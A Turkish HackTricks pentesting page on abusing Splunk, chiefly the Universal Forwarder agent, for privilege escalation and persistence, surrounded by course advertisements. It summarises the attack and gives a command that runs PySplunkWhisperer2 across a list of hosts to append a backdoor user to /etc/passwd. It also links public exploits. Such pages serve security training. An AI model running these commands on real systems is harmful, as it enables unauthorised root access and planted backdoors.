# Splunk LPE ve Süreklilik

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

Bir makineyi **içten** veya **dıştan** **numaralandırırken** **Splunk çalışıyorsa** (port 8090), şansınız varsa herhangi bir **geçerli kimlik bilgisi** biliyorsanız, **Splunk hizmetini kötüye kullanarak** Splunk'ı çalıştıran kullanıcı olarak **bir shell çalıştırabilirsiniz**. Eğer root çalışıyorsa, yetkileri root'a yükseltebilirsiniz.

Ayrıca eğer **zaten root iseniz ve Splunk hizmeti yalnızca localhost'ta dinlemiyorsa**, Splunk hizmetinden **şifre** dosyasını **çalıp** şifreleri **kırabilir** veya **yeni** kimlik bilgileri ekleyebilirsiniz. Ve host üzerinde sürekliliği sürdürebilirsiniz.

Aşağıdaki ilk resimde, bir Splunkd web sayfasının nasıl göründüğünü görebilirsiniz.



## Splunk Universal Forwarder Agent İstismar Özeti

Daha fazla detay için [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) gönderisini kontrol edin. Bu sadece bir özet:

**İstismar Genel Bakış:**
Splunk Universal Forwarder Agent (UF) hedef alan bir istismar, ajan şifresine sahip saldırganların ajanı çalıştıran sistemlerde rastgele kod çalıştırmasına olanak tanır ve potansiyel olarak tüm bir ağı tehlikeye atabilir.

**Ana Noktalar:**
- UF ajanı gelen bağlantıları veya kodun doğruluğunu doğrulamaz, bu da yetkisiz kod çalıştırmaya karşı savunmasız hale getirir.
- Yaygın şifre edinme yöntemleri, bunları ağ dizinlerinde, dosya paylaşımlarında veya iç belgelerde bulmayı içerir.
- Başarılı bir istismar, tehlikeye atılan hostlarda SYSTEM veya root düzeyinde erişim, veri sızdırma ve daha fazla ağ sızması ile sonuçlanabilir.

**İstismar Uygulaması:**
1. Saldırgan UF ajan şifresini elde eder.
2. Ajanlara komut veya betik göndermek için Splunk API'sini kullanır.
3. Olası eylemler arasında dosya çıkarma, kullanıcı hesabı manipülasyonu ve sistemin tehlikeye atılması yer alır.

**Etkisi:**
- Her hostta SYSTEM/root düzeyinde izinlerle tam ağ tehlikesi.
- Tespiti önlemek için günlük kaydını devre dışı bırakma potansiyeli.
- Arka kapılar veya fidye yazılımlarının kurulumu.

**İstismar için Örnek Komut:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Kullanılabilir kamuya açık istismarlar:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Splunk Sorgularını Kötüye Kullanma

**Daha fazla detay için [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis) gönderisini kontrol edin**

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuçlarını paylaşmak için [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.**

</details>
{% endhint %}
